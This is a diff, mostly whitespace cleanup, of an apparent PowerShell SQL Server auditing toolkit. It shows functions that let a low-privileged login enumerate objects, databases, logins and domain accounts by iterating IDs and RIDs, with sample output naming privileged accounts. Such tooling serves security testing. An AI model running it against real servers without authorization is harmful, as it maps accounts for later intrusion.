             ProcedureType       : PROCEDURE
             ProcedureDefinition : CREATE PROC MyTestProc
-            WITH EXECUTE AS OWNER 
+            WITH EXECUTE AS OWNER
             as
             begin
-            select SYSTEM_USER as currentlogin, ORIGINAL_LOGIN() as originallogin                              
+            select SYSTEM_USER as currentlogin, ORIGINAL_LOGIN() as originallogin
             end
             .EXAMPLE
             PS C:\> Get-SQLInstanceDomain | Get-SQLStoredProcure -Verbose -NoDefaults
@@ -7049,19 +7054,19 @@ Function  Get-SQLStoredProcedure
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
-        [Parameter(Mandatory = $false,                
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server database name.')]
         [string]$DatabaseName,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Trigger name.')]
         [string]$ProcedureName,
 
@@ -7091,7 +7096,7 @@ Function  Get-SQLStoredProcedure
     }
 
     Process
-    {        
+    {
         # Parse ComputerName
         If ($Instance)
         {
@@ -7103,7 +7108,7 @@ Function  Get-SQLStoredProcedure
             $ComputerName = $env:COMPUTERNAME
             $Instance = '.\'
         }
-            
+
         # Test connection to instance
         $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
             $_.Status -eq 'Accessible'
@@ -7134,8 +7139,8 @@ Function  Get-SQLStoredProcedure
         else
         {
             # Get list of databases
-            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose           
-        } 
+            $TblDatabases = Get-SQLDatabase -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName $DatabaseName -HasAccess -SuppressVerbose
+        }
 
         # Get role for each database
         $TblDatabases |
@@ -7149,7 +7154,7 @@ Function  Get-SQLStoredProcedure
             }
 
             # Define Query
-            $Query = "  use [$DbName]; 
+            $Query = "  use [$DbName];
                 SELECT  '$ComputerName' as [ComputerName],
                 '$Instance' as [Instance],
                 ROUTINE_CATALOG AS [DatabaseName],
@@ -7162,20 +7167,20 @@ Function  Get-SQLStoredProcedure
                 CREATED,
                 LAST_ALTERED
                 FROM [INFORMATION_SCHEMA].[ROUTINES] WHERE 1=1
-            $ProcedureNameFilter" 
+            $ProcedureNameFilter"
 
             # Execute Query
             $TblProcsTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
             # Append results
             $TblProcs = $TblProcs + $TblProcsTemp
-        }                                
+        }
     }
 
     End
-    {  
+    {
         # Return data
-        $TblProcs       
+        $TblProcs
     }
 }
 
@@ -7201,13 +7206,13 @@ Function  Get-SQLFuzzObjectName
             .SYNOPSIS
             Enumerates objects based on object id using OBJECT_NAME() and only the Public role.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER StartId
             Principal ID to start fuzzing with.
             .PARAMETER EndId
@@ -7215,23 +7220,23 @@ Function  Get-SQLFuzzObjectName
             .EXAMPLE
             PS C:\> Get-SQLFuzzObjectName -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 5
 
-            ComputerName   Instance                       ObjectId ObjectName   
-            ------------   --------                       -------- ----------   
-            SQLServer1     SQLServer1\STANDARDDEV2014     3        sysrscols    
-            SQLServer1     SQLServer1\STANDARDDEV2014     5        sysrowsets   
-            SQLServer1     SQLServer1\STANDARDDEV2014     6        sysclones    
+            ComputerName   Instance                       ObjectId ObjectName
+            ------------   --------                       -------- ----------
+            SQLServer1     SQLServer1\STANDARDDEV2014     3        sysrscols
+            SQLServer1     SQLServer1\STANDARDDEV2014     5        sysrowsets
+            SQLServer1     SQLServer1\STANDARDDEV2014     6        sysclones
             SQLServer1     SQLServer1\STANDARDDEV2014     7        sysallocunits
             SQLServer1     SQLServer1\STANDARDDEV2014     8        sysfiles1
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
@@ -7239,9 +7244,9 @@ Function  Get-SQLFuzzObjectName
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
@@ -7266,17 +7271,17 @@ Function  Get-SQLFuzzObjectName
 
     Process
     {
-        # All user defined objects are assigned a positive object ID plus system tables. 
+        # All user defined objects are assigned a positive object ID plus system tables.
         # Apart from these objects, the rest of the system objects are assigned negative object IDs.
         # This object_id comes from the primary key of system table sys.sysschobjs.The column name is id, int  data type and it is not an identity column
         # If you create a new object in the database, the first ID will always be 2073058421 in SQL SERVER 2005 and 245575913 in SQL SERVER 2012.
-        # The object_ID increment counter for user defined objects will add 16000057 + Last user defined object_ID and will give you a new ID.    
-        <# IThis object_id comes from the primary key of system table sys.sysschobjs. The new object_id will increase 16000057 (a prime number) from 
+        # The object_ID increment counter for user defined objects will add 16000057 + Last user defined object_ID and will give you a new ID.
+        <# IThis object_id comes from the primary key of system table sys.sysschobjs. The new object_id will increase 16000057 (a prime number) from
                 last object_id. When the last object_id +16000057 is over the int maximum ( 2147483647), it will start with a new number before the difference
                 between the new bigint number and the maximum int. This cycle will generate 134 or 135 new object_id for each cycle. The system has a maximum
                 number of objects,  which is 2147483647.
                 The object ID is only unique within each database.
-        #>          
+        #>
 
         # Parse computer name from the instance
         $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
@@ -7309,14 +7314,14 @@ Function  Get-SQLFuzzObjectName
         }
 
         # Fuzz from StartId to EndId
-        $StartId..$EndId | 
+        $StartId..$EndId |
         ForEach-Object -Process {
             # Define Query
             $Query = "SELECT    '$ComputerName' as [ComputerName],
                 '$Instance' as [Instance],
-                '$_' as [ObjectId], 
+                '$_' as [ObjectId],
             OBJECT_NAME($_) as [ObjectName]"
-                                        
+
             # Execute Query
             $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
 
@@ -7332,14 +7337,14 @@ Function  Get-SQLFuzzObjectName
                     Write-Verbose -Message "$Instance : - Object ID $_ resolved to: "
                 }
             }
-        
+
             # Append results
-            $TblFuzzedObjects = $TblFuzzedObjects + $TblResults   
-        }  
+            $TblFuzzedObjects = $TblFuzzedObjects + $TblResults
+        }
     }
 
     End
-    {  
+    {
         # Return data
         $TblFuzzedObjects | Where-Object -FilterScript {
             $_.ObjectName.length -ge 2
@@ -7358,13 +7363,13 @@ Function  Get-SQLFuzzDatabaseName
             .SYNOPSIS
             Enumerates databases based on database id using DB_NAME() and only the Public role.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER StartId
             Principal ID to start fuzzing with.
             .PARAMETER EndId
@@ -7372,23 +7377,23 @@ Function  Get-SQLFuzzDatabaseName
             .EXAMPLE
             PS C:\> Get-SQLFuzzDatabaseName -Instance SQLServer1\STANDARDDEV2014 | Select-Object -First 5
 
-            ComputerName   Instance                       DatabaseId DatabaseName                
-            ------------   --------                       ---------- ------------                
-            SQLServer1     SQLServer1\STANDARDDEV2014     1          master                      
-            SQLServer1     SQLServer1\STANDARDDEV2014     2          tempdb                      
-            SQLServer1     SQLServer1\STANDARDDEV2014     3          model                       
-            SQLServer1     SQLServer1\STANDARDDEV2014     4          msdb                        
+            ComputerName   Instance                       DatabaseId DatabaseName
+            ------------   --------                       ---------- ------------
+            SQLServer1     SQLServer1\STANDARDDEV2014     1          master
+            SQLServer1     SQLServer1\STANDARDDEV2014     2          tempdb
+            SQLServer1     SQLServer1\STANDARDDEV2014     3          model
+            SQLServer1     SQLServer1\STANDARDDEV2014     4          msdb
             SQLServer1     SQLServer1\STANDARDDEV2014     5          ReportServer$STANDARDDEV2014
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
@@ -7396,9 +7401,9 @@ Function  Get-SQLFuzzDatabaseName
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
@@ -7454,17 +7459,17 @@ Function  Get-SQLFuzzDatabaseName
         }
 
         # Fuzz from StartId to EndId
-        $StartId..$EndId | 
+        $StartId..$EndId |
         ForEach-Object -Process {
             # Define Query
             $Query = "SELECT    '$ComputerName' as [ComputerName],
                 '$Instance' as [Instance],
-                '$_' as [DatabaseId], 
+                '$_' as [DatabaseId],
             DB_NAME($_) as [DatabaseName]"
-                                        
+
             # Execute Query
             $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
-            
+
             $DatabaseName = $TblResults.DatabaseName
             if($DatabaseName.length -ge 2)
             {
@@ -7479,15 +7484,15 @@ Function  Get-SQLFuzzDatabaseName
                 {
                     Write-Verbose -Message "$Instance : - ID $_ - Resolved to:"
                 }
-            } 
-        
+            }
+
             # Append results
-            $TblFuzzedDbs = $TblFuzzedDbs + $TblResults   
-        }  
+            $TblFuzzedDbs = $TblFuzzedDbs + $TblResults
+        }
     }
 
     End
-    {  
+    {
         # Return data
         $TblFuzzedDbs | Where-Object -FilterScript {
             $_.DatabaseName.length -ge 2
@@ -7506,13 +7511,13 @@ Function  Get-SQLFuzzServerLogin
             .SYNOPSIS
             Enumerates SQL Server Logins based on login id using SUSER_NAME() and only the Public role.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER StartId
             Principal ID to start fuzzing with.
             .PARAMETER EndId
@@ -7522,58 +7527,58 @@ Function  Get-SQLFuzzServerLogin
             .EXAMPLE
             PS C:\> Get-SQLFuzzServerLogin -Instance SQLServer1\STANDARDDEV2014 -StartId 1 -EndId 500 | Select-Object -First 40
 
-            ComputerName   Instance                       PrincipalId PrincipleName                
-            ------------   --------                       ----------  -------------                                                        
-            SQLServer1     SQLServer1\STANDARDDEV2014     1           sa                                     
-            SQLServer1     SQLServer1\STANDARDDEV2014     2           public                                 
-            SQLServer1     SQLServer1\STANDARDDEV2014     3           sysadmin                               
-            SQLServer1     SQLServer1\STANDARDDEV2014     4           securityadmin                          
-            SQLServer1     SQLServer1\STANDARDDEV2014     5           serveradmin                            
-            SQLServer1     SQLServer1\STANDARDDEV2014     6           setupadmin                             
-            SQLServer1     SQLServer1\STANDARDDEV2014     7           processadmin                           
-            SQLServer1     SQLServer1\STANDARDDEV2014     8           diskadmin                              
-            SQLServer1     SQLServer1\STANDARDDEV2014     9           dbcreator                              
-            SQLServer1     SQLServer1\STANDARDDEV2014     10          bulkadmin                              
-            SQLServer1     SQLServer1\STANDARDDEV2014     101         ##MS_SQLResourceSigningCertificate##   
+            ComputerName   Instance                       PrincipalId PrincipleName
+            ------------   --------                       ----------  -------------
+            SQLServer1     SQLServer1\STANDARDDEV2014     1           sa
+            SQLServer1     SQLServer1\STANDARDDEV2014     2           public
+            SQLServer1     SQLServer1\STANDARDDEV2014     3           sysadmin
+            SQLServer1     SQLServer1\STANDARDDEV2014     4           securityadmin
+            SQLServer1     SQLServer1\STANDARDDEV2014     5           serveradmin
+            SQLServer1     SQLServer1\STANDARDDEV2014     6           setupadmin
+            SQLServer1     SQLServer1\STANDARDDEV2014     7           processadmin
+            SQLServer1     SQLServer1\STANDARDDEV2014     8           diskadmin
+            SQLServer1     SQLServer1\STANDARDDEV2014     9           dbcreator
+            SQLServer1     SQLServer1\STANDARDDEV2014     10          bulkadmin
+            SQLServer1     SQLServer1\STANDARDDEV2014     101         ##MS_SQLResourceSigningCertificate##
             SQLServer1     SQLServer1\STANDARDDEV2014     102         ##MS_SQLReplicationSigningCertificate##
-            SQLServer1     SQLServer1\STANDARDDEV2014     103         ##MS_SQLAuthenticatorCertificate##     
-            SQLServer1     SQLServer1\STANDARDDEV2014     105         ##MS_PolicySigningCertificate##        
-            SQLServer1     SQLServer1\STANDARDDEV2014     106         ##MS_SmoExtendedSigningCertificate##   
-            SQLServer1     SQLServer1\STANDARDDEV2014     121         ##Agent XPs##                          
-            SQLServer1     SQLServer1\STANDARDDEV2014     122         ##SQL Mail XPs##                       
-            SQLServer1     SQLServer1\STANDARDDEV2014     123         ##Database Mail XPs##                  
-            SQLServer1     SQLServer1\STANDARDDEV2014     124         ##SMO and DMO XPs##                    
-            SQLServer1     SQLServer1\STANDARDDEV2014     125         ##Ole Automation Procedures##          
-            SQLServer1     SQLServer1\STANDARDDEV2014     126         ##Web Assistant Procedures##           
-            SQLServer1     SQLServer1\STANDARDDEV2014     127         ##xp_cmdshell##                        
-            SQLServer1     SQLServer1\STANDARDDEV2014     128         ##Ad Hoc Distributed Queries##         
-            SQLServer1     SQLServer1\STANDARDDEV2014     129         ##Replication XPs##                    
-            SQLServer1     SQLServer1\STANDARDDEV2014     257         ##MS_PolicyTsqlExecutionLogin##        
-            SQLServer1     SQLServer1\STANDARDDEV2014     259         Domain\User                     
-            SQLServer1     SQLServer1\STANDARDDEV2014     260         NT SERVICE\SQLWriter                   
-            SQLServer1     SQLServer1\STANDARDDEV2014     261         NT SERVICE\Winmgmt                     
-            SQLServer1     SQLServer1\STANDARDDEV2014     262         NT Service\MSSQL$STANDARDDEV2014       
-            SQLServer1     SQLServer1\STANDARDDEV2014     263         NT AUTHORITY\SYSTEM                    
-            SQLServer1     SQLServer1\STANDARDDEV2014     264         NT SERVICE\SQLAgent$STANDARDDEV2014    
+            SQLServer1     SQLServer1\STANDARDDEV2014     103         ##MS_SQLAuthenticatorCertificate##
+            SQLServer1     SQLServer1\STANDARDDEV2014     105         ##MS_PolicySigningCertificate##
+            SQLServer1     SQLServer1\STANDARDDEV2014     106         ##MS_SmoExtendedSigningCertificate##
+            SQLServer1     SQLServer1\STANDARDDEV2014     121         ##Agent XPs##
+            SQLServer1     SQLServer1\STANDARDDEV2014     122         ##SQL Mail XPs##
+            SQLServer1     SQLServer1\STANDARDDEV2014     123         ##Database Mail XPs##
+            SQLServer1     SQLServer1\STANDARDDEV2014     124         ##SMO and DMO XPs##
+            SQLServer1     SQLServer1\STANDARDDEV2014     125         ##Ole Automation Procedures##
+            SQLServer1     SQLServer1\STANDARDDEV2014     126         ##Web Assistant Procedures##
+            SQLServer1     SQLServer1\STANDARDDEV2014     127         ##xp_cmdshell##
+            SQLServer1     SQLServer1\STANDARDDEV2014     128         ##Ad Hoc Distributed Queries##
+            SQLServer1     SQLServer1\STANDARDDEV2014     129         ##Replication XPs##
+            SQLServer1     SQLServer1\STANDARDDEV2014     257         ##MS_PolicyTsqlExecutionLogin##
+            SQLServer1     SQLServer1\STANDARDDEV2014     259         Domain\User
+            SQLServer1     SQLServer1\STANDARDDEV2014     260         NT SERVICE\SQLWriter
+            SQLServer1     SQLServer1\STANDARDDEV2014     261         NT SERVICE\Winmgmt
+            SQLServer1     SQLServer1\STANDARDDEV2014     262         NT Service\MSSQL$STANDARDDEV2014
+            SQLServer1     SQLServer1\STANDARDDEV2014     263         NT AUTHORITY\SYSTEM
+            SQLServer1     SQLServer1\STANDARDDEV2014     264         NT SERVICE\SQLAgent$STANDARDDEV2014
             SQLServer1     SQLServer1\STANDARDDEV2014     265         NT SERVICE\ReportServer$STANDARDDEV2014
-            SQLServer1     SQLServer1\STANDARDDEV2014     266         ##MS_PolicyEventProcessingLogin##      
-            SQLServer1     SQLServer1\STANDARDDEV2014     267         ##MS_AgentSigningCertificate##         
-            SQLServer1     SQLServer1\STANDARDDEV2014     268         MySQLUser1                               
-            SQLServer1     SQLServer1\STANDARDDEV2014     270         MySQLUser2                              
-            SQLServer1     SQLServer1\STANDARDDEV2014     271         MySQLUser3                             
-            SQLServer1     SQLServer1\STANDARDDEV2014     272         MySysadmin1                                   
-            SQLServer1     SQLServer1\STANDARDDEV2014     273         Domain\User2                          
-            SQLServer1     SQLServer1\STANDARDDEV2014     274         MySysadmin2                                  
+            SQLServer1     SQLServer1\STANDARDDEV2014     266         ##MS_PolicyEventProcessingLogin##
+            SQLServer1     SQLServer1\STANDARDDEV2014     267         ##MS_AgentSigningCertificate##
+            SQLServer1     SQLServer1\STANDARDDEV2014     268         MySQLUser1
+            SQLServer1     SQLServer1\STANDARDDEV2014     270         MySQLUser2
+            SQLServer1     SQLServer1\STANDARDDEV2014     271         MySQLUser3
+            SQLServer1     SQLServer1\STANDARDDEV2014     272         MySysadmin1
+            SQLServer1     SQLServer1\STANDARDDEV2014     273         Domain\User2
+            SQLServer1     SQLServer1\STANDARDDEV2014     274         MySysadmin2
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
@@ -7581,9 +7586,9 @@ Function  Get-SQLFuzzServerLogin
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
@@ -7638,7 +7643,7 @@ Function  Get-SQLFuzzServerLogin
             if( -not $SuppressVerbose)
             {
                 Write-Verbose -Message "$Instance : Connection Success."
-                Write-Verbose -Message "$Instance : Enumerating principal names from principal IDs.."                
+                Write-Verbose -Message "$Instance : Enumerating principal names from principal IDs.."
             }
         }
         else
@@ -7651,30 +7656,30 @@ Function  Get-SQLFuzzServerLogin
         }
 
         # Fuzz from StartId to EndId
-        $StartId..$EndId | 
+        $StartId..$EndId |
         ForEach-Object -Process {
             # Define Query
             $Query = "SELECT    '$ComputerName' as [ComputerName],
                 '$Instance' as [Instance],
-                '$_' as [PrincipalId], 
+                '$_' as [PrincipalId],
             SUSER_NAME($_) as [PrincipleName]"
-                                        
+
             # Execute Query
             $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
-                        
+
             # check if principal is role, sql login, or windows account
-            $PrincipalName = $TblResults.PrincipleName            
+            $PrincipalName = $TblResults.PrincipleName
             $PrincipalId = $TblResults.PrincipalId
-            
+
             if($GetPrincipalType)
             {
                 $RoleCheckQuery = "EXEC master..sp_defaultdb '$PrincipalName', 'NOTAREALDATABASE1234ABCD'"
                 $RoleCheckResults = Get-SQLQuery -Instance $Instance -Query $RoleCheckQuery -Username $Username -Password $Password -Credential $Credential -SuppressVerbose -ReturnError
-            
+
                 # Check the error message for a signature that means the login is real
                 if (($RoleCheckResults -like '*NOTAREALDATABASE*') -or ($RoleCheckResults -like '*alter the login*'))
                 {
-                    # 
+                    #
                     if($PrincipalName -like '*\*')
                     {
                         $PrincipalType = 'Windows Account'
@@ -7687,10 +7692,10 @@ Function  Get-SQLFuzzServerLogin
                 else
                 {
                     $PrincipalType = 'SQL Server Role'
-                }         
+                }
             }
 
-            # Output for user                        
+            # Output for user
             if(-not $SuppressVerbose)
             {
                 if($PrincipalName.length -ge 2)
@@ -7702,9 +7707,9 @@ Function  Get-SQLFuzzServerLogin
                     Write-Verbose -Message "$Instance : - Principal ID $_ resolved to: "
                 }
             }
-        
+
             # Append results
-            #$TblFuzzedLogins = $TblFuzzedLogins + $TblResults   
+            #$TblFuzzedLogins = $TblFuzzedLogins + $TblResults
             if($GetPrincipalType)
             {
                 $null = $TblFuzzedLogins.Rows.Add($ComputerName, $Instance, $PrincipalId, $PrincipalName, $PrincipalType)
@@ -7713,11 +7718,11 @@ Function  Get-SQLFuzzServerLogin
             {
                 $null = $TblFuzzedLogins.Rows.Add($ComputerName, $Instance, $PrincipalId, $PrincipalName)
             }
-        }  
+        }
     }
 
     End
-    {  
+    {
         # Return data
         $TblFuzzedLogins | Where-Object -FilterScript {
             $_.PrincipleName.length -ge 2
@@ -7737,13 +7742,13 @@ Function  Get-SQLFuzzDomainAccount
             Enumerates domain groups, computer accounts, and user accounts based on domain RID using SUSER_SNAME() and only the Public role.
             Note: In a typical domain 10000 or more is recommended for the EndId.
             .PARAMETER Username
-            SQL Server or domain account to authenticate with.   
+            SQL Server or domain account to authenticate with.
             .PARAMETER Password
-            SQL Server or domain account password to authenticate with. 
+            SQL Server or domain account password to authenticate with.
             .PARAMETER Credential
-            SQL Server credential. 
+            SQL Server credential.
             .PARAMETER Instance
-            SQL Server instance to connection to. 
+            SQL Server instance to connection to.
             .PARAMETER StartId
             RID to start fuzzing with.
             .PARAMETER EndId
@@ -7753,46 +7758,46 @@ Function  Get-SQLFuzzDomainAccount
 
             VERBOSE: SQLServer1\STANDARDDEV2014 : Connection Success.
             VERBOSE: SQLServer1\STANDARDDEV2014 : Enumerating Domain accounts from the SQL Server's default domain...
-            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f4010000 (500) Resolved to: Domain\Administrator        
-            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f5010000 (501) Resolved to: Domain\Guest        
-            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f6010000 (502) Resolved to: Domain\krbtgt                
+            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f4010000 (500) Resolved to: Domain\Administrator
+            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f5010000 (501) Resolved to: Domain\Guest
+            VERBOSE: SQLServer1\STANDARDDEV2014 : RID 0x010500000000000515000000A132413243431431326051C0f6010000 (502) Resolved to: Domain\krbtgt
             [TRUNCATED]
 
-            ComputerName   Instance                       DomainAccount                                 
-            ------------   --------                       -------------                                 
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Administrator                          
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Guest                                  
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\krbtgt                                 
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Guests                          
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Computers                       
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Controllers                     
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Cert Publishers                        
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Schema Admins                          
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Enterprise Admins                      
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Group Policy Creator Owners            
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Read-only Domain Controllers           
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Cloneable Domain Controllers           
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Protected Users                        
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\RAS and IAS Servers                    
+            ComputerName   Instance                       DomainAccount
+            ------------   --------                       -------------
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Administrator
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Guest
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\krbtgt
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Guests
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Computers
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Domain Controllers
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Cert Publishers
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Schema Admins
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Enterprise Admins
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Group Policy Creator Owners
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Read-only Domain Controllers
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Cloneable Domain Controllers
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Protected Users
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\RAS and IAS Servers
             SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Allowed RODC Password Replication Group
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Denied RODC Password Replication Group 
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\HelpServicesGroup  
-        
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\Denied RODC Password Replication Group
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\HelpServicesGroup
+
             [TRUNCATED]
 
-            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyUser                 
+            SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyUser
             SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyDAUser
             SQLServer1     SQLServer1\STANDARDDEV2014     Domain\MyEAUser
     #>
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account to authenticate with.')]
         [string]$Username,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server or domain account password to authenticate with.')]
         [string]$Password,
 
@@ -7800,9 +7805,9 @@ Function  Get-SQLFuzzDomainAccount
         HelpMessage = 'Windows credentials.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance to connection to.')]
         [string]$Instance,
 
@@ -7826,7 +7831,7 @@ Function  Get-SQLFuzzDomainAccount
     }
 
     Process
-    {        
+    {
         # Parse computer name from the instance
         $ComputerName = Get-ComputerNameFromInstance -Instance $Instance
 
@@ -7858,7 +7863,7 @@ Function  Get-SQLFuzzDomainAccount
         }
 
         # Grab server information
-        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose                  
+        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         $ComputerName = $ServerInfo.ComputerName
         $Instance = $ServerInfo.Instance
         $Domain = $ServerInfo.DomainName
@@ -7866,15 +7871,15 @@ Function  Get-SQLFuzzDomainAccount
         $DomainGroupSid = Get-SQLQuery -Instance $Instance -Query "select SUSER_SID('$DomainGroup') as DomainGroupSid" -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
         $DomainGroupSidBytes = $DomainGroupSid | Select-Object -Property domaingroupsid -ExpandProperty domaingroupsid
         $DomainGroupSidString = [System.BitConverter]::ToString($DomainGroupSidBytes).Replace('-','').Substring(0,48)
-        
+
         # Fuzz from StartId to EndId
-        $StartId..$EndId | 
+        $StartId..$EndId |
         ForEach-Object -Process {
             # Convert to Principal ID to hex
             $PrincipalIDHex = '{0:x}' -f $_
 
             # Get number of characters
-            $PrincipalIDHexPad1 = $PrincipalIDHex | Measure-Object -Character         
